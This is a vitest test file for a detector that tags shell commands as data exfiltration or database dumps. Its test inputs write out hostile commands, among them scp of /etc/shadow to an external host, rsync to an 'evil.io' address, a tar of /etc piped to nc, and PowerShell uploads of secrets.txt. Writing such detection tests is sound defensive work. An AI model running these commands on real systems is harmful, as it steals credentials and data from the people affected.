/**
 * Data-leak detection flag scanner tests.
 *
 * `deriveDataLeakFlags()` implements 数据泄露监测统一标准 v0.2.0 §5.2 tag
 * injection for L1.1 (transfer-tool features → data_exfiltration) and L3.1
 * (dump tools → db_dump). Detection-only: destinations that are entirely
 * internal (RFC1918 / loopback / intranet names) and local-default DB dumps
 * stay silent so normal backup/sync business does not light up exfil alerts
 * (标准 §6.2 禁令 1).
 */
import { describe, expect, it } from 'vitest'
import { deriveDataLeakFlags } from '../src/utils/dataLeakFlags.js'

describe('deriveDataLeakFlags — data_exfiltration (L1.1)', () => {
  const exfil = (cmd: string) => expect(deriveDataLeakFlags(cmd)).toContain('data_exfiltration')
  const silent = (cmd: string) => expect(deriveDataLeakFlags(cmd)).not.toContain('data_exfiltration')

  it('flags curl uploads to external addresses', () => {
    exfil('curl -T data.zip https://transfer.example.com/')
    exfil('curl -d @payload.json http://1.2.3.4:8080/collect')
    exfil('curl --data-binary @db.sql https://paste.example.org/x')
  })

  it('stays silent for downloads (no upload gesture)', () => {
    silent('curl -O https://example.com/file.tar.gz')
    silent('wget https://example.com/file.tar.gz')
    silent('curl -s https://internal.example.com/health')
  })

  it('stays silent for internal destinations (inline whitelist)', () => {
    silent('curl -T build.tar.gz http://10.0.0.1/repo/')
    silent('curl -T build.tar.gz https://artifacts.company.internal/repo/')
    silent('curl -d x=1 http://192.168.1.10:9000/api')
    silent('curl -d x=1 http://172.16.0.5/api')
    silent('curl -T f http://localhost:8080/upload')
    silent('scp dist.tar.gz backup:/srv/releases/')
    silent('rsync -av /data backup::mod')
  })

  it('flags scp/rsync/rclone toward external hosts', () => {
    exfil('scp /etc/shadow root@files.example.com:/tmp/')
    exfil('rsync -av /data leaked@rsync.evil.io::vault')
    exfil('rclone copy /home/docs gdrive:backup')
  })

  it('flags git push (destination unknown at argv level)', () => {
    exfil('git push origin main')
  })

  it('flags piped transfers to external bare IPs only', () => {
    exfil('tar cf - /etc | nc 8.8.8.8 9999')
    silent('tar cf - /data | nc 10.0.0.5 9999')
  })

  it('flags PowerShell -InFile uploads', () => {
    exfil('Invoke-WebRequest -Uri https://webhook.example.com/x -InFile secrets.txt -Method Post')
  })
})

describe('deriveDataLeakFlags — db_dump (L3.1)', () => {
  const dump = (cmd: string) => expect(deriveDataLeakFlags(cmd)).toContain('db_dump')
  const silent = (cmd: string) => expect(deriveDataLeakFlags(cmd)).not.toContain('db_dump')

  it('flags dumps against explicit external hosts', () => {
    dump('mysqldump --host 10.1.2.3 proddb > dump.sql')
    dump('mysqldump -h 10.1.2.3 proddb > dump.sql')
    dump('pg_dump -h 10.1.2.3 appdb > dump.sql')
    dump('mongoexport --host 10.1.2.3 --db app --collection users')
    dump('redis-cli -h 10.1.2.3 --rdb /tmp/dump.rdb')
  })

  it('stays silent for local backups (host default = localhost)', () => {
    silent('mysqldump --host localhost appdb > backup.sql')
    silent('mysqldump --host=127.0.0.1 appdb > backup.sql')
    silent('mysqldump appdb > backup.sql') // no --host → local socket default
    silent('pg_dump appdb > backup.sql')
    silent('redis-cli --rdb /tmp/dump.rdb') // default localhost
  })

  it('flags dump forms without a usable host signal', () => {
    dump('sqlite3 /data/app.db .dump')
    dump('bcp appdb.dbo.users out users.dat -c')
    dump("mysql -e \"select * from users into outfile '/tmp/u.txt'\"")
  })
})

describe('deriveDataLeakFlags — general', () => {
  it('returns [] for empty / non-string / oversized input', () => {
    expect(deriveDataLeakFlags('')).toEqual([])
    expect(deriveDataLeakFlags('ls -la')).toEqual([])
    expect(deriveDataLeakFlags('x'.repeat(20 * 1024))).toEqual([])
  })

  it('de-duplicates and can return both tags', () => {
    const flags = deriveDataLeakFlags('mysqldump --host 10.1.2.3 db | curl -T - https://ext.example.com/')
    expect(flags).toContain('db_dump')
    expect(flags).toContain('data_exfiltration')
    expect(new Set(flags).size).toBe(flags.length)
  })
})
